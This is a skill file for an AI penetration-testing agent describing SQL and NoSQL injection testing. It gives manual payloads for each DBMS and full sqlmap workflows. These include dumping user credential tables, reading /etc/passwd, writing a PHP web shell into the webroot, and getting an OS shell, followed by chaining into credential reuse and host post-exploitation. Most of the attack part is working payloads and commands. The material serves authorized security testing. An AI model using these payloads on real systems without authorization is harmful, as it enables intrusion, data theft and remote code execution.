---
name: sqli-testing
description: Detect, confirm, and exploit SQL injection (WSTG-INPV-05 / CWE-89) across GET, POST, JSON, header, and cookie parameters — manual error/boolean/time/UNION/stacked probes first, then sqlmap end to end (detection, enumeration, dumping, file access, os-shell), with NoSQL operator injection as an adjacent class; parses sqlmap output into rupu work units, assets.mark calls, and findings.report payloads. Use on any parameterized endpoint that could reach a SQL backend.
license: Apache-2.0
metadata:
  author: Section9Labs
---

# SQL Injection Testing (WSTG-INPV-05)

Inputs: parameterized URLs/requests from crawling and parameter discovery (katana/gau output,
proxy history, discovered forms). Outputs: confirmed injection points, extracted data, possible
RCE via `--os-shell`, all recorded into rupu (see `references/rupu.md`).

Work every injectable surface, not just the query string: POST bodies, JSON fields, cookies,
`User-Agent`/`Referer`/`X-Forwarded-For` headers, path segments (REST ids), and multipart fields.

## 1. Manual detection first

Always ground sqlmap's verdict with a manual probe — it tells you the DBMS, the injection
context (string vs numeric, quoting, parenthesis depth), and whether a WAF is interfering.
Full per-DBMS payload tables and error-string fingerprints: `references/manual-sqli.md`.

1. **Error-based probe.** Send `'`, `"`, `)`, `')`, `\`. A 500/stack trace or a SQL error string
   in the body ("You have an error in your SQL syntax" = MySQL, "unterminated quoted string" /
   `PG::SyntaxError` = PostgreSQL, "Unclosed quotation mark" = MSSQL, `ORA-01756` = Oracle,
   `SQLITE_ERROR` = SQLite) confirms the parameter reaches SQL and names the DBMS.
2. **Boolean differential.** `' AND 1=1-- -` vs `' AND 1=2-- -` (string context) or
   `1 AND 1=1` vs `1 AND 1=2` (numeric). Identical response for TRUE/baseline and a different
   response (length, content, status) for FALSE = boolean-blind injectable. Also try
   `' OR '1'='1` on login forms.
3. **Time-based.** When responses are indistinguishable:
   MySQL `' AND SLEEP(5)-- -`, PostgreSQL `'||pg_sleep(5)--` or `';SELECT pg_sleep(5)--`,
   MSSQL `';WAITFOR DELAY '0:0:5'--`, Oracle `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`,
   SQLite `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- -`.
   Measure baseline latency first; demand a repeatable +5s delta, then confirm with a
   control (`SLEEP(0)`) to rule out jitter.
4. **UNION column counting.** `' ORDER BY 1-- -`, `' ORDER BY 2-- -` ... until error → column
   count = last success. Then `' UNION SELECT NULL,NULL,...-- -` adjusting NULL count; swap
   NULLs for markers (`'sqli1'`, `0x53514c69`) to find which columns render. Extract with
   `' UNION SELECT username,password FROM users-- -`.
5. **Stacked queries.** `';SELECT 1-- -` / `';WAITFOR DELAY '0:0:5'--`. Supported on MSSQL and
   PostgreSQL (and MySQL only via certain drivers). Stacked support is what makes
   `--os-shell`, `INSERT/UPDATE` tampering, and `xp_cmdshell` possible — note it explicitly.
6. **Comment syntax matters:** `-- -` (space required, works MySQL/MSSQL/PG), `#` (MySQL),
   `--` (PG/MSSQL/Oracle), `/*comment*/`. Try all; a WAF may filter one.

Capture every confirming request/response pair from the proxy — it becomes finding evidence.

## 2. sqlmap end to end

Full flag reference, tamper catalog, and os-shell workflow: `references/sqlmap.md`.

**Target input.** Prefer `-r request.txt` — save the raw request from Burp/mitmproxy
(Repeater → Copy to file). It carries cookies, auth headers, and the POST/JSON body exactly.
Add `--force-ssl` when the saved request is HTTPS. Otherwise:

```
sqlmap -u "https://192.0.2.10/item.php?id=1&cat=2" --batch
sqlmap -r request.txt --force-ssl --batch
sqlmap -u "https://192.0.2.10/api/item" --data='{"id":"1"}' -H "Content-Type: application/json" --batch
```

`--batch` is mandatory for automation — without it sqlmap blocks on interactive prompts.

**Targeting the right input.** `-p id` tests only that parameter; `--skip=csrf_token` skips one.
Mark an arbitrary injection point with `*` in the URL/body/header
(`-u "https://192.0.2.10/user/1*/profile"` for path segments; put `*` in a header value in the
`-r` file). `--cookie="PHPSESSID=...; role=user"` plus `--level>=2` tests cookies;
`--level>=3` tests `User-Agent`/`Referer`. `-H "X-Forwarded-For: 1*"` with `-r` tests headers.

**Coverage and aggression.**

```
sqlmap -r request.txt --batch --level=5 --risk=3 --technique=BEUSTQ
```

- `--level=1..5`: widens *which inputs* are tested (2: cookies, 3: UA/Referer/Host) and payload count.
- `--risk=1..3`: riskier payloads (2: heavy time-based, 3: OR-based — can modify data in UPDATEs).
- `--technique=BEUSTQ`: B boolean, E error, U union, S stacked, T time, Q inline.
  **Include `S` whenever you intend `--os-shell`/`--os-cmd`** — they need stacked queries.
- `--dbms=mysql` (or postgresql/mssql/oracle/sqlite) once fingerprinted — big speedup.
- WAF evasion: `--tamper="between,randomcase"` (comma-separated, no spaces); add
  `--random-agent`, `--delay=1`, `--chunked`. See the tamper table in `references/sqlmap.md`.
- `--proxy=http://127.0.0.1:8080` to watch traffic through your intercepting proxy.
- Auto-discovery when you have only a site root: `sqlmap -u https://192.0.2.10/ --crawl=3 --forms --batch`.

**Reading the verdict.** On success sqlmap prints an injection-point block — this is the
canonical result and also lands in the log file:

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4321=4321
    Type: time-based blind
    Payload: id=1 AND SLEEP(5)
back-end DBMS: MySQL >= 5.0.12
```

Parameter + place (GET/POST/Cookie/Header/JSON/URI), technique types, exact payloads, DBMS.
Everything persists under `~/.local/share/sqlmap/output/<host>/` (`log` text, `session.sqlite`
hashdb, `target.txt`, `dump/` CSVs) so re-runs resume instantly; `--flush-session` to redo.

**Enumeration ladder** (each run resumes the session; add `--threads=5` for blind):

```
sqlmap -r request.txt --batch --current-user --current-db --is-dba --hostname
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D appdb --tables
sqlmap -r request.txt --batch -D appdb -T users --columns
sqlmap -r request.txt --batch -D appdb -T users -C username,password,email --dump
sqlmap -r request.txt --batch --passwords          # DBMS login hashes
sqlmap -r request.txt --batch --privileges --roles
sqlmap -r request.txt --batch --search -C passw    # find password-ish columns anywhere
```

Always narrow `--dump` with `-D/-T/-C`; `--dump-all --exclude-sysdbs` only when a full pull is
the objective. `--start/--stop` limit rows on huge tables.

**Machine-readable extraction.**

```
sqlmap -r request.txt --batch --dump-format=JSONL --output-dir=./sqlmap-out --results-file=./results.csv
```

`--dump-format=CSV|HTML|SQLITE|JSONL` controls dump files; `--results-file` writes a CSV of
`Target URL,Place,Parameter,Technique(s),Note(s)`; `--output-dir` relocates the whole output
tree (otherwise `~/.local/share/sqlmap/output/<host>/`). These are what `scripts/parse_sqlmap.py`
consumes.

**Escalation.**

```
sqlmap -r request.txt --batch --technique=S --os-shell       # interactive OS shell
sqlmap -r request.txt --batch --technique=S --os-cmd="id"    # one-shot command
sqlmap -r request.txt --batch --file-read=/etc/passwd
sqlmap -r request.txt --batch --file-write=./shell.php --file-dest=/var/www/html/s.php
sqlmap -r request.txt --batch --sql-shell                    # raw SQL REPL over the injection
```

`--os-shell`/`--os-cmd` require stacked queries (`S` in `--technique`) **and** privileges:
MySQL `FILE` priv + writable webroot (sqlmap asks for the webroot and uploads a stager),
PostgreSQL largely via `COPY ... TO/FROM PROGRAM` (superuser), MSSQL via `xp_cmdshell`
(`--is-dba` true usually means it will work, sqlmap re-enables it if disabled). A working
os-shell upgrades the finding to critical and chains into host exploitation.

## 3. NoSQL injection (adjacent class)

When the backend is MongoDB/Mongoose/documentDB, SQL syntax errors never appear; test operator
injection instead (details + payload list in `references/manual-sqli.md` §NoSQL):

- Query string / form: `username[$ne]=x&password[$ne]=x` (PHP/Express qs parsing turns
  `a[$ne]=x` into `{a:{$ne:"x"}}`) → auth bypass. Also `[$gt]=`, `[$regex]=^a`, `[$in][]=admin`.
- JSON body: `{"user":{"$ne":null},"pass":{"$ne":null}}`; blind extraction via
  `{"$regex":"^a"}` character-by-character; `$where: "sleep(5000)"` for time-based.
- Tools: **NoSQLMap** (interactive, MongoDB-focused) and **nosqli** (Go:
  `nosqli scan -t "https://192.0.2.10/login"`). Classify as CWE-943 / WSTG-INPV-05.

## 4. Parse, record, hand off (rupu)

Every parse step ends in rupu-ingestible output — shapes and wiring in `references/rupu.md`.

```
python3 scripts/parse_sqlmap.py \
    --output-dir ~/.local/share/sqlmap/output/192.0.2.10 \
    --results-file ./results.csv \
    -o merged.json \
    --work-units work-units.json \
    --findings findings.json \
    --assets assets.json
```

The script extracts injectable parameters (place/type/payload/DBMS), current-user/is-DBA facts,
and dumped-table summaries from the sqlmap `log`, `target.txt`, `results.csv`, and `dump/` CSVs,
then emits:

1. `work-units.json` — a clean JSON array (first char `[`), one unit per injectable parameter
   still to exploit/dump, each `{"id","title","targets","hints":{...}}` with a ready-to-run
   sqlmap command in `hints.next`. Hand this to the `work-units` skill to normalize/split, then
   a rupu workflow `for_each:` or a lead agent `dispatch` fans out one child per element.
2. `assets.json` — `assets.mark` payloads: the site as `web:site` and each injected route as
   `web:route` (url + http_route + param coordinates). Confirmed injection = depth `exploited`;
   parameters sqlmap tested but found clean = depth `tested`. Record via the `coverage-assets` skill.
3. `findings.json` — one `findings.report` payload per injectable parameter: scope `endpoint`,
   `target_ref` the affected URL, severity high (critical when stacked queries / DBA / data
   dumped / os-shell), `evidence.rationale` naming the parameter, technique, and payload with a
   sample HTTP exchange, classification `WSTG-INPV-05` + `CWE-89` (CWE-943 for NoSQL). Attach
   the proxy-captured request/response pair, then file each via the `finding-report` skill.

Manual-only confirmations (no sqlmap run) still go through the same outputs: mark the route
`exploited` with `assets.mark` and write the finding via the `finding-report` skill with the
boolean/time differential exchange as evidence.

## Chaining

- **In:** parameterized URLs from crawl/param-discovery skills; raw requests from the proxy.
- **Out:** confirmed injection points (→ work units for targeted dumping), extracted
  credentials (→ auth/session testing, credential reuse), `--file-read`/`--file-write` and
  `--os-shell` (→ host-level post-exploitation), DB schema knowledge (→ IDOR/authz testing).
